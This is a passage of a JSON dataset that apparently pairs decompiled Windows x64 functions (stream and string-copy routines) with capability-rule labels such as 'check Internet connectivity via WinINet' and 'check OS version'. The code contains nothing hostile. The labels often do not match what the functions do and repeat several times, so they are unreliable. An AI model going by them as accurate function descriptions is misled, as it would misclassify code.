        "decompiled_code": "\nint64_t * fcn.140079680(int64_t *arg1, ulong arg2)\n\n{\n    int64_t *piVar1;\n    char cVar2;\n    int32_t iVar3;\n    int64_t iVar4;\n    char acStack40 [8];\n    int64_t *piStack32;\n    \n    fcn.140079da0(acStack40, arg1);\n    if (acStack40[0] != '\\0') {\n        piVar1 = *(arg1 + *(*arg1 + -0x18) + 0xe8);\n        if (piVar1[5] < piVar1[6]) {\n            *piVar1[5] = arg2;\n            piVar1[5] = piVar1[5] + 1;\n        }\n        else {\n            iVar3 = (**(*piVar1 + 0x68))();\n            if (iVar3 == -1) {\n                iVar4 = *(*arg1 + -0x18) + arg1;\n                fcn.1400b4ab0(iVar4, *(iVar4 + 0x20) | 1);\n            }\n        }\n    }\n    iVar4 = *(*piStack32 + -0x18);\n    if ((*(piStack32 + iVar4 + 0x19) & 0x20) != 0) {\n        cVar2 = fcn.1400b76c0();\n        if ((cVar2 == '\\0') && (piVar1 = *(piStack32 + iVar4 + 0xe8),  piVar1 != NULL)) {\n            iVar3 = (**(*piVar1 + 0x30))();\n            if (iVar3 == -1) {\n                iVar4 = piStack32 + *(*piStack32 + -0x18);\n                fcn.1400b4ab0(iVar4, *(iVar4 + 0x20) | 1);\n            }\n        }\n    }\n    return arg1;\n}\n",
        "token_count": 427
    },
    "14007986": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint64_t * fcn.140079860(int64_t *arg1)\n\n{\n    int64_t *piVar1;\n    char cVar2;\n    int32_t iVar3;\n    int64_t iVar4;\n    char acStack40 [8];\n    int64_t *piStack32;\n    \n    if (*(arg1 + *(*arg1 + -0x18) + 0xe8) != 0) {\n        fcn.140079da0(acStack40, arg1);\n        if (acStack40[0] != '\\0') {\n            iVar3 = (**(**(arg1 + *(*arg1 + -0x18) + 0xe8) + 0x30))();\n            if (iVar3 == -1) {\n                iVar4 = *(*arg1 + -0x18) + arg1;\n                fcn.1400b4ab0(iVar4, *(iVar4 + 0x20) | 1);\n            }\n        }\n        iVar4 = *(*piStack32 + -0x18);\n        if ((*(piStack32 + iVar4 + 0x19) & 0x20) != 0) {\n            cVar2 = fcn.1400b76c0();\n            if ((cVar2 == '\\0') && (piVar1 = *(piStack32 + iVar4 + 0xe8),  piVar1 != NULL)) {\n                iVar3 = (**(*piVar1 + 0x30))();\n                if (iVar3 == -1) {\n                    iVar4 = piStack32 + *(*piStack32 + -0x18);\n                    fcn.1400b4ab0(iVar4, *(iVar4 + 0x20) | 1);\n                }\n            }\n        }\n    }\n    return arg1;\n}\n",
        "token_count": 389
    },
    "1400b67b": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint64_t * fcn.1400b67b0(int64_t *arg1, ulong arg2, int64_t arg3)\n\n{\n    char cVar1;\n    uchar uVar2;\n    int32_t iVar3;\n    int64_t iVar4;\n    int64_t *piVar5;\n    int64_t iVar6;\n    int64_t *piVar7;\n    uint32_t uVar8;\n    int64_t iVar9;\n    int64_t iVar10;\n    char acStack88 [8];\n    int64_t *piStack80;\n    \n    piVar7 = arg1;\n    fcn.140079da0(acStack88, arg1);\n    if (acStack88[0] == '\\0') goto code_r0x0001400b68a8;\n    iVar4 = *(*arg1 + -0x18);\n    iVar6 = arg1 + iVar4;\n    iVar10 = *(iVar6 + 0x10);\n    if (arg3 < iVar10) {\n        uVar8 = *(iVar6 + 0x18) & 0xb0;\n        if (uVar8 != 0x20) {\n            iVar9 = iVar10 - arg3;\n            if (*(iVar6 + 0xe1) != '\\0') {\n                uVar2 = *(iVar6 + 0xe0);\ncode_r0x0001400b6849:\n                do {\n                    piVar7 = *(arg1 + iVar4 + 0xe8);\n                    if (piVar7[5] < piVar7[6]) {\n                        *piVar7[5] = uVar2;\n                        piVar7[5] = piVar7[5] + 1;\n                    }\n                    else {\n                        iVar3 = (**(*piVar7 + 0x68))();\n                        if (iVar3 == -1) {\n                            iVar6 = *(*arg1 + -0x18) + arg1;\n                            fcn.1400b4ab0(iVar6, *(iVar6 + 0x20) | 1);\n                            iVar6 = *(*arg1 + -0x18) + arg1;\n                            if (*(iVar6 + 0x20) != 0) goto code_r0x0001400b68a0;\n                            goto code_r0x0001400b694f;\n                        }\n                    }\n                    iVar4 = *(*arg1 + -0x18);\n                    iVar9 = iVar9 + -1;\n                } while (iVar9 != 0);\n                iVar6 = arg1 + iVar4;\n                goto code_r0x0001400b6944;\n            }\n            piVar5 = *(iVar6 + 0xf0);\n            if (piVar5 != NULL) {\n                if (*(piVar5 + 7) == '\\0') {\n                    fcn.14002b2c0(piVar5);\n                    uVar2 = 0x20;\n                    if (*(*piVar5 + 0x30) != 0x14002bab0) {\n                        uVar2 = (**(*piVar5 + 0x30))(piVar5);\n                    }\n                }\n                else {\n                    uVar2 = *(piVar5 + 0x59);\n                }\n                *(iVar6 + 0xe0) = uVar2;\n                iVar4 = *arg1;\n                *(iVar6 + 0xe1) = 1;\n                iVar4 = *(iVar4 + -0x18);\n                goto code_r0x0001400b6849;\n            }\ncode_r0x0001400b6b2d:\n            piVar5 = fcn.1400bd1f0();\n            if (piVar7 == 0x1) {\n                fcn.1400bc860(piVar5);\n                arg1 = arg1 + *(*arg1 + -0x18);\n                piVar5 = arg1;\n                fcn.1400b4780(arg1, 1);\n                fcn.1400bcd60();\n            }\n            fcn.1400bc860(piVar5);\n            fcn.1400b4780(*(*arg1 + -0x18) + arg1, 1);\n            fcn.1400bca40();\n            goto code_r0x0001400b68a8;\n        }\ncode_r0x0001400b6944:\n        if (*(iVar6 + 0x20) == 0) {\ncode_r0x0001400b694f:\n            iVar4 = (**(**(iVar6 + 0xe8) + 0x60))(*(iVar6 + 0xe8), arg2, arg3);\n            iVar6 = *arg1;\n            if (arg3 != iVar4) {\n                iVar6 = *(iVar6 + -0x18) + arg1;\n                fcn.1400b4ab0(iVar6, *(iVar6 + 0x20) | 1);\n                iVar6 = *arg1;\n            }\n            iVar4 = *(iVar6 + -0x18);\n            iVar6 = arg1 + iVar4;\n            if ((uVar8 == 0x20) && (piVar7 = *(iVar6 + 0x20),  *(iVar6 + 0x20) == 0)) {\n                iVar10 = iVar10 - arg3;\n                if (*(iVar6 + 0xe1) == '\\0') {\n                    piVar5 = *(iVar6 + 0xf0);\n                    if (piVar5 == NULL) {\n                        fcn.1400bd1f0();\n                        goto code_r0x0001400b6b2d;\n                    }\n                    if (*(piVar5 + 7) == '\\0') {\n                        fcn.14002b2c0(piVar5);\n                        uVar2 = 0x20;\n                        if (*(*piVar5 + 0x30) != 0x14002bab0) {\n                            uVar2 = (**(*piVar5 + 0x30))(piVar5);\n                        }\n                    }\n                    else {\n                        uVar2 = *(piVar5 + 0x59);\n                    }\n                    *(iVar6 + 0xe0) = uVar2;\n                    iVar4 = *arg1;\n                    *(iVar6 + 0xe1) = 1;\n                    iVar4 = *(iVar4 + -0x18);\n                }\n                else {\n                    uVar2 = *(iVar6 + 0xe0);\n                }\n                do {\n                    piVar7 = *(arg1 + iVar4 + 0xe8);\n                    if (piVar7[5] < piVar7[6]) {\n                        *piVar7[5] = uVar2;\n                        piVar7[5] = piVar7[5] + 1;\n                    }\n                    else {\n                        iVar3 = (**(*piVar7 + 0x68))();\n                        if (iVar3 == -1) {\n                            iVar6 = *(*arg1 + -0x18) + arg1;\n                            fcn.1400b4ab0(iVar6, *(iVar6 + 0x20) | 1);\n                            goto code_r0x0001400b6928;\n                        }\n                    }\n                    iVar4 = *(*arg1 + -0x18);\n                    iVar10 = iVar10 + -1;\n                } while (iVar10 != 0);\n                iVar6 = arg1 + iVar4;\n            }\n        }\n    }\n    else {\n        iVar4 = (**(**(iVar6 + 0xe8) + 0x60))(*(iVar6 + 0xe8), arg2, arg3);\n        iVar6 = *(*arg1 + -0x18) + arg1;\n        if (arg3 != iVar4) {\n            fcn.1400b4ab0(iVar6, *(iVar6 + 0x20) | 1);\ncode_r0x0001400b6928:\n            *(arg1 + *(*arg1 + -0x18) + 0x10) = 0;\n            goto code_r0x0001400b68a8;\n        }\n    }\ncode_r0x0001400b68a0:\n    *(iVar6 + 0x10) = 0;\ncode_r0x0001400b68a8:\n    iVar6 = *(*piStack80 + -0x18);\n    if (((((*(piStack80 + iVar6 + 0x19) & 0x20) != 0) && (cVar1 = fcn.1400b76c0(),  cVar1 == '\\0')) &&\n        (piVar7 = *(piStack80 + iVar6 + 0xe8),  piVar7 != NULL)) && (iVar3 = (**(*piVar7 + 0x30))(),  iVar3 == -1)) {\n        iVar6 = piStack80 + *(*piStack80 + -0x18);\n        fcn.1400b4ab0(iVar6, *(iVar6 + 0x20) | 1);\n    }\n    return arg1;\n}\n",
        "token_count": 1956
    },
    "14007a5d": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint64_t * fcn.14007a5d0(int64_t *arg1)\n\n{\n    unkbyte10 Var1;\n    int64_t *arg1_00;\n    int64_t iVar2;\n    char cVar3;\n    int64_t *piVar4;\n    int32_t iVar5;\n    unkbyte10 *in_RDX;\n    int64_t *piVar6;\n    int64_t iVar7;\n    unkbyte10 Stack104;\n    int64_t iStack88;\n    uint64_t uStack80;\n    uchar auStack72 [8];\n    char cStack64;\n    char acStack56 [8];\n    int64_t *piStack48;\n    \n    Var1 = *in_RDX;\n    piVar6 = arg1;\n    fcn.140079da0(acStack56, arg1);\n    if (acStack56[0] == '\\0') goto code_r0x00014007a690;\n    iVar7 = *(*arg1 + -0x18) + arg1;\n    piVar4 = *(iVar7 + 0xf8);\n    if (piVar4 == NULL) {\n        fcn.1400bd1f0();\ncode_r0x00014007a77f:\n        piVar4 = fcn.1400bd1f0();\n        if (piVar6 == 0x1) {\n            fcn.1400bc860(piVar4);\n            fcn.1400b4780(arg1 + *(*arg1 + -0x18), 1);\n            arg1 = fcn.1400bcd60();\n            fcn.140079ea0(acStack56);\n            piVar4 = arg1;\n            fcn.140014f30(arg1);\n        }\n        fcn.1400bc860(piVar4);\n        fcn.1400b4780(*(*arg1 + -0x18) + arg1, 1);\n        fcn.1400bca40();\n    }\n    else {\n        if (*(iVar7 + 0xe1) == '\\0') {\n            arg1_00 = *(iVar7 + 0xf0);\n            if (arg1_00 == NULL) goto code_r0x00014007a77f;\n            if (*(arg1_00 + 7) == '\\0') {\n                fcn.14002b2c0(arg1_00);\n                iVar5 = 0x20;\n                cVar3 = ' ';\n                if (*(*arg1_00 + 0x30) != 0x14002bab0) {\n                    cVar3 = (**(*arg1_00 + 0x30))(arg1_00, 0x20);\n                    iVar5 = cVar3;\n                }\n            }\n            else {\n                cVar3 = *(arg1_00 + 0x59);\n                iVar5 = cVar3;\n            }\n            *(iVar7 + 0xe0) = cVar3;\n            iVar2 = *arg1;\n            *(iVar7 + 0xe1) = 1;\n            iVar7 = *(iVar2 + -0x18) + arg1;\n        }\n        else {\n            iVar5 = *(iVar7 + 0xe0);\n        }\n        iStack88 = *(iVar7 + 0xe8);\n        uStack80 = iStack88 == 0;\n        Stack104 = Var1;\n        (**(*piVar4 + 0x40))(auStack72, piVar4, &iStack88, iVar7, iVar5, &Stack104);\n        if (cStack64 != '\\0') {\n            iVar7 = *(*arg1 + -0x18) + arg1;\n            fcn.1400b4ab0(iVar7, *(iVar7 + 0x20) | 1);\n        }\n    }\ncode_r0x00014007a690:\n    iVar7 = *(*piStack48 + -0x18);\n    if ((*(piStack48 + iVar7 + 0x19) & 0x20) != 0) {\n        cVar3 = fcn.1400b76c0();\n        if ((cVar3 == '\\0') && (piVar6 = *(piStack48 + iVar7 + 0xe8),  piVar6 != NULL)) {\n            iVar5 = (**(*piVar6 + 0x30))();\n            if (iVar5 == -1) {\n                iVar7 = *(*piStack48 + -0x18) + piStack48;\n                fcn.1400b4ab0(iVar7, *(iVar7 + 0x20) | 1);\n            }\n        }\n    }\n    return arg1;\n}\n",
        "token_count": 1009
    },
    "14007b82": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.14007b820(int64_t *arg1)\n\n{\n    int64_t iVar1;\n    \n    iVar1 = *arg1;\n    if (*(iVar1 + -0x18) == 0) {\n        return;\n    }\n    if (**0x14010fc90 == 0) {\n        if (*(iVar1 + -8) < 1) goto code_r0x00014007b84e;\n    }\n    else if (*(iVar1 + -8) < 1) {\n        iVar1 = *arg1;\n        goto code_r0x00014007b84e;\n    }\n    fcn.14007d8a0(arg1, 0, 0, 0);\n    iVar1 = *arg1;\ncode_r0x00014007b84e:\n    *(iVar1 + -8) = 0xffffffff;\n    return;\n}\n",
        "token_count": 191
    },
    "14007b89": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint64_t * fcn.14007b890(int64_t arg1, ulong arg2)\n\n{\n    int64_t *piVar1;\n    int64_t *piVar2;\n    \n    piVar1 = fcn.14007c090(arg1, 0);\n    piVar2 = piVar1 + 3;\n    if (arg1 != 0) {\n        if (arg1 == 1) {\n            *(piVar1 + 3) = arg2;\n        }\n        else {\n            piVar2 = sub.msvcrt.dll_memset(piVar2, arg2, arg1);\n        }\n    }\n    *(piVar1 + 2) = 0;\n    *piVar1 = arg1;\n    *(piVar1 + arg1 + 0x18) = 0;\n    return piVar2;\n}\n",
        "token_count": 183
    },
    "14007b96": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint64_t * fcn.14007b960(uchar *arg1, int64_t arg2)\n\n{\n    int64_t *piVar1;\n    int64_t *piVar2;\n    uchar *puVar3;\n    int64_t iVar4;\n    int64_t iVar5;\n    ulong in_R9;\n    \n    if ((arg2 == 0) || (arg1 != NULL)) {\n        arg2 = arg2 - arg1;\n        piVar1 = fcn.14007c090(arg2, 0);\n        piVar2 = piVar1 + 3;\n        if (arg2 == 1) {\n            *(piVar1 + 3) = *arg1;\n        }\n        else if (arg2 != 0) {\n            piVar2 = sub.msvcrt.dll_memcpy(piVar2, arg1, arg2);\n        }\n        *(piVar1 + 2) = 0;\n        *piVar1 = arg2;\n        *(piVar1 + arg2 + 0x18) = 0;\n        return piVar2;\n    }\n    puVar3 = 0x14010aae0;\n    iVar4 = arg2;\n    fcn.1400bd270(0x14010aae0);\n    if ((iVar4 == 0) || (puVar3 != NULL)) {\n        iVar4 = iVar4 - puVar3;\n        piVar1 = fcn.14007c090(iVar4, 0);\n        piVar2 = piVar1 + 3;\n        if (iVar4 == 1) {\n            *(piVar1 + 3) = *puVar3;\n        }\n        else if (iVar4 != 0) {\n            piVar2 = sub.msvcrt.dll_memcpy(piVar2, puVar3, iVar4, in_R9, arg2);\n        }\n        *(piVar1 + 2) = 0;\n        *piVar1 = iVar4;\n        *(piVar1 + iVar4 + 0x18) = 0;\n        return piVar2;\n    }\n    puVar3 = 0x14010a880;\n    iVar5 = iVar4;\n    fcn.1400bd270(0x14010a880);\n    if ((iVar5 == 0) || (puVar3 != NULL)) {\n        iVar5 = iVar5 - puVar3;\n        piVar1 = fcn.14007c090(iVar5, 0);\n        piVar2 = piVar1 + 3;\n        if (iVar5 == 1) {\n            *(piVar1 + 3) = *puVar3;\n        }\n        else if (iVar5 != 0) {\n            piVar2 = sub.msvcrt.dll_memcpy(piVar2, puVar3, iVar5, in_R9, iVar4);\n        }\n        *(piVar1 + 2) = 0;\n        *piVar1 = iVar5;\n        *(piVar1 + iVar5 + 0x18) = 0;\n        return piVar2;\n    }\n    puVar3 = 0x14010b700;\n    iVar4 = iVar5;\n    fcn.1400bd270(0x14010b700);\n    if ((iVar4 != 0) && (puVar3 == NULL)) {\n        puVar3 = 0x14010bcb0;\n        iVar5 = iVar4;\n        fcn.1400bd270(0x14010bcb0);\n        if ((iVar5 == 0) || (puVar3 != NULL)) {\n            iVar5 = iVar5 - puVar3;\n            piVar1 = fcn.14007c090(iVar5, 0);\n            piVar2 = piVar1 + 3;\n            if (iVar5 == 1) {\n                *(piVar1 + 3) = *puVar3;\n            }\n            else if (iVar5 != 0) {\n                piVar2 = sub.msvcrt.dll_memcpy(piVar2, puVar3, iVar5, in_R9, iVar4);\n            }\n            *(piVar1 + 2) = 0;\n            *piVar1 = iVar5;\n            *(piVar1 + iVar5 + 0x18) = 0;\n            return piVar2;\n        }\n        puVar3 = 0x14010e560;\n        iVar4 = iVar5;\n        fcn.1400bd270(0x14010e560);\n        if ((iVar4 != 0) && (puVar3 == NULL)) {\n            fcn.1400bd270(0x14010aae0);\n            return 0x1401083e0;\n        }\n        iVar4 = iVar4 - puVar3;\n        piVar1 = fcn.14007c090(iVar4, 0);\n        piVar2 = piVar1 + 3;\n        if (iVar4 == 1) {\n            *(piVar1 + 3) = *puVar3;\n        }\n        else if (iVar4 != 0) {\n            piVar2 = sub.msvcrt.dll_memcpy(piVar2, puVar3, iVar4, in_R9, iVar5);\n        }\n        *(piVar1 + 2) = 0;\n        *piVar1 = iVar4;\n        *(piVar1 + iVar4 + 0x18) = 0;\n        return piVar2;\n    }\n    iVar4 = iVar4 - puVar3;\n    piVar1 = fcn.14007c090(iVar4, 0);\n    piVar2 = piVar1 + 3;\n    if (iVar4 == 1) {\n        *(piVar1 + 3) = *puVar3;\n    }\n    else if (iVar4 != 0) {\n        piVar2 = sub.msvcrt.dll_memcpy(piVar2, puVar3, iVar4, in_R9, iVar5);\n    }\n    *(piVar1 + 2) = 0;\n    *piVar1 = iVar4;\n    *(piVar1 + iVar4 + 0x18) = 0;\n    return piVar2;\n}\n",
        "token_count": 1334
    },
    "14007b9e": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint64_t * fcn.14007b9e0(uchar *arg1, int64_t arg2)\n\n{\n    int64_t *piVar1;\n    int64_t *piVar2;\n    uchar *puVar3;\n    int64_t iVar4;\n    int64_t iVar5;\n    ulong in_R9;\n    \n    if ((arg2 == 0) || (arg1 != NULL)) {\n        arg2 = arg2 - arg1;\n        piVar1 = fcn.14007c090(arg2, 0);\n        piVar2 = piVar1 + 3;\n        if (arg2 == 1) {\n            *(piVar1 + 3) = *arg1;\n        }\n        else if (arg2 != 0) {\n            piVar2 = sub.msvcrt.dll_memcpy(piVar2, arg1, arg2);\n        }\n        *(piVar1 + 2) = 0;\n        *piVar1 = arg2;\n        *(piVar1 + arg2 + 0x18) = 0;\n        return piVar2;\n    }\n    puVar3 = 0x14010a880;\n    iVar4 = arg2;\n    fcn.1400bd270(0x14010a880);\n    if ((iVar4 == 0) || (puVar3 != NULL)) {\n        iVar4 = iVar4 - puVar3;\n        piVar1 = fcn.14007c090(iVar4, 0);\n        piVar2 = piVar1 + 3;\n        if (iVar4 == 1) {\n            *(piVar1 + 3) = *puVar3;\n        }\n        else if (iVar4 != 0) {\n            piVar2 = sub.msvcrt.dll_memcpy(piVar2, puVar3, iVar4, in_R9, arg2);\n        }\n        *(piVar1 + 2) = 0;\n        *piVar1 = iVar4;\n        *(piVar1 + iVar4 + 0x18) = 0;\n        return piVar2;\n    }\n    puVar3 = 0x14010b700;\n    iVar5 = iVar4;\n    fcn.1400bd270(0x14010b700);\n    if ((iVar5 == 0) || (puVar3 != NULL)) {\n        iVar5 = iVar5 - puVar3;\n        piVar1 = fcn.14007c090(iVar5, 0);\n        piVar2 = piVar1 + 3;\n        if (iVar5 == 1) {\n            *(piVar1 + 3) = *puVar3;\n        }\n        else if (iVar5 != 0) {\n            piVar2 = sub.msvcrt.dll_memcpy(piVar2, puVar3, iVar5, in_R9, iVar4);\n        }\n        *(piVar1 + 2) = 0;\n        *piVar1 = iVar5;\n        *(piVar1 + iVar5 + 0x18) = 0;\n        return piVar2;\n    }\n    puVar3 = 0x14010bcb0;\n    iVar4 = iVar5;\n    fcn.1400bd270(0x14010bcb0);\n    if ((iVar4 != 0) && (puVar3 == NULL)) {\n        puVar3 = 0x14010e560;\n        iVar5 = iVar4;\n        fcn.1400bd270(0x14010e560);\n        if ((iVar5 != 0) && (puVar3 == NULL)) {\n            fcn.1400bd270(0x14010aae0);\n            return 0x1401083e0;\n        }\n        iVar5 = iVar5 - puVar3;\n        piVar1 = fcn.14007c090(iVar5, 0);\n        piVar2 = piVar1 + 3;\n        if (iVar5 == 1) {\n            *(piVar1 + 3) = *puVar3;\n        }\n        else if (iVar5 != 0) {\n            piVar2 = sub.msvcrt.dll_memcpy(piVar2, puVar3, iVar5, in_R9, iVar4);\n        }\n        *(piVar1 + 2) = 0;\n        *piVar1 = iVar5;\n        *(piVar1 + iVar5 + 0x18) = 0;\n        return piVar2;\n    }\n    iVar4 = iVar4 - puVar3;\n    piVar1 = fcn.14007c090(iVar4, 0);\n    piVar2 = piVar1 + 3;\n    if (iVar4 == 1) {\n        *(piVar1 + 3) = *puVar3;\n    }\n    else if (iVar4 != 0) {\n        piVar2 = sub.msvcrt.dll_memcpy(piVar2, puVar3, iVar4, in_R9, iVar5);\n    }\n    *(piVar1 + 2) = 0;\n    *piVar1 = iVar4;\n    *(piVar1 + iVar4 + 0x18) = 0;\n    return piVar2;\n}\n",
        "token_count": 1121
    },
    "14007ba6": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint64_t * fcn.14007ba60(uchar *arg1, int64_t arg2)\n\n{\n    int64_t *piVar1;\n    int64_t *piVar2;\n    uchar *puVar3;\n    int64_t iVar4;\n    int64_t iVar5;\n    ulong in_R9;\n    \n    if ((arg2 == 0) || (arg1 != NULL)) {\n        arg2 = arg2 - arg1;\n        piVar1 = fcn.14007c090(arg2, 0);\n        piVar2 = piVar1 + 3;\n        if (arg2 == 1) {\n            *(piVar1 + 3) = *arg1;\n        }\n        else if (arg2 != 0) {\n            piVar2 = sub.msvcrt.dll_memcpy(piVar2, arg1, arg2);\n        }\n        *(piVar1 + 2) = 0;\n        *piVar1 = arg2;\n        *(piVar1 + arg2 + 0x18) = 0;\n        return piVar2;\n    }\n    puVar3 = 0x14010b700;\n    iVar4 = arg2;\n    fcn.1400bd270(0x14010b700);\n    if ((iVar4 == 0) || (puVar3 != NULL)) {\n        iVar4 = iVar4 - puVar3;\n        piVar1 = fcn.14007c090(iVar4, 0);\n        piVar2 = piVar1 + 3;\n        if (iVar4 == 1) {\n            *(piVar1 + 3) = *puVar3;\n        }\n        else if (iVar4 != 0) {\n            piVar2 = sub.msvcrt.dll_memcpy(piVar2, puVar3, iVar4, in_R9, arg2);\n        }\n        *(piVar1 + 2) = 0;\n        *piVar1 = iVar4;\n        *(piVar1 + iVar4 + 0x18) = 0;\n        return piVar2;\n    }\n    puVar3 = 0x14010bcb0;\n    iVar5 = iVar4;\n    fcn.1400bd270(0x14010bcb0);\n    if ((iVar5 == 0) || (puVar3 != NULL)) {\n        iVar5 = iVar5 - puVar3;\n        piVar1 = fcn.14007c090(iVar5, 0);\n        piVar2 = piVar1 + 3;\n        if (iVar5 == 1) {\n            *(piVar1 + 3) = *puVar3;\n        }\n        else if (iVar5 != 0) {\n            piVar2 = sub.msvcrt.dll_memcpy(piVar2, puVar3, iVar5, in_R9, iVar4);\n        }\n        *(piVar1 + 2) = 0;\n        *piVar1 = iVar5;\n        *(piVar1 + iVar5 + 0x18) = 0;\n        return piVar2;\n    }\n    puVar3 = 0x14010e560;\n    iVar4 = iVar5;\n    fcn.1400bd270(0x14010e560);\n    if ((iVar4 != 0) && (puVar3 == NULL)) {\n        fcn.1400bd270(0x14010aae0);\n        return 0x1401083e0;\n    }\n    iVar4 = iVar4 - puVar3;\n    piVar1 = fcn.14007c090(iVar4, 0);\n    piVar2 = piVar1 + 3;\n    if (iVar4 == 1) {\n        *(piVar1 + 3) = *puVar3;\n    }\n    else if (iVar4 != 0) {\n        piVar2 = sub.msvcrt.dll_memcpy(piVar2, puVar3, iVar4, in_R9, iVar5);\n    }\n    *(piVar1 + 2) = 0;\n    *piVar1 = iVar4;\n    *(piVar1 + iVar4 + 0x18) = 0;\n    return piVar2;\n}\n",
        "token_count": 906
    },
    "14007bae": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint64_t * fcn.14007bae0(uchar *arg1, int64_t arg2)\n\n{\n    int64_t *piVar1;\n    int64_t *piVar2;\n    uchar *puVar3;\n    int64_t iVar4;\n    int64_t iVar5;\n    ulong in_R9;\n    \n    if ((arg2 == 0) || (arg1 != NULL)) {\n        arg2 = arg2 - arg1;\n        piVar1 = fcn.14007c090(arg2, 0);\n        piVar2 = piVar1 + 3;\n        if (arg2 == 1) {\n            *(piVar1 + 3) = *arg1;\n        }\n        else if (arg2 != 0) {\n            piVar2 = sub.msvcrt.dll_memcpy(piVar2, arg1, arg2);\n        }\n        *(piVar1 + 2) = 0;\n        *piVar1 = arg2;\n        *(piVar1 + arg2 + 0x18) = 0;\n        return piVar2;\n    }\n    puVar3 = 0x14010bcb0;\n    iVar4 = arg2;\n    fcn.1400bd270(0x14010bcb0);\n    if ((iVar4 != 0) && (puVar3 == NULL)) {\n        puVar3 = 0x14010e560;\n        iVar5 = iVar4;\n        fcn.1400bd270(0x14010e560);\n        if ((iVar5 != 0) && (puVar3 == NULL)) {\n            fcn.1400bd270(0x14010aae0);\n            return 0x1401083e0;\n        }\n        iVar5 = iVar5 - puVar3;\n        piVar1 = fcn.14007c090(iVar5, 0);\n        piVar2 = piVar1 + 3;\n        if (iVar5 == 1) {\n            *(piVar1 + 3) = *puVar3;\n        }\n        else if (iVar5 != 0) {\n            piVar2 = sub.msvcrt.dll_memcpy(piVar2, puVar3, iVar5, in_R9, iVar4);\n        }\n        *(piVar1 + 2) = 0;\n        *piVar1 = iVar5;\n        *(piVar1 + iVar5 + 0x18) = 0;\n        return piVar2;\n    }\n    iVar4 = iVar4 - puVar3;\n    piVar1 = fcn.14007c090(iVar4, 0);\n    piVar2 = piVar1 + 3;\n    if (iVar4 == 1) {\n        *(piVar1 + 3) = *puVar3;\n    }\n    else if (iVar4 != 0) {\n        piVar2 = sub.msvcrt.dll_memcpy(piVar2, puVar3, iVar4, in_R9, arg2);\n    }\n    *(piVar1 + 2) = 0;\n    *piVar1 = iVar4;\n    *(piVar1 + iVar4 + 0x18) = 0;\n    return piVar2;\n}\n",
        "token_count": 694
    },
    "14007bb6": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint64_t * fcn.14007bb60(uchar *arg1, int64_t arg2)\n\n{\n    int64_t *piVar1;\n    int64_t *piVar2;\n    uchar *puVar3;\n    int64_t iVar4;\n    ulong in_R9;\n    \n    if ((arg2 == 0) || (arg1 != NULL)) {\n        arg2 = arg2 - arg1;\n        piVar1 = fcn.14007c090(arg2, 0);\n        piVar2 = piVar1 + 3;\n        if (arg2 == 1) {\n            *(piVar1 + 3) = *arg1;\n        }\n        else if (arg2 != 0) {\n            piVar2 = sub.msvcrt.dll_memcpy(piVar2, arg1, arg2);\n        }\n        *(piVar1 + 2) = 0;\n        *piVar1 = arg2;\n        *(piVar1 + arg2 + 0x18) = 0;\n        return piVar2;\n    }\n    puVar3 = 0x14010e560;\n    iVar4 = arg2;\n    fcn.1400bd270(0x14010e560);\n    if ((iVar4 != 0) && (puVar3 == NULL)) {\n        fcn.1400bd270(0x14010aae0);\n        return 0x1401083e0;\n    }\n    iVar4 = iVar4 - puVar3;\n    piVar1 = fcn.14007c090(iVar4, 0);\n    piVar2 = piVar1 + 3;\n    if 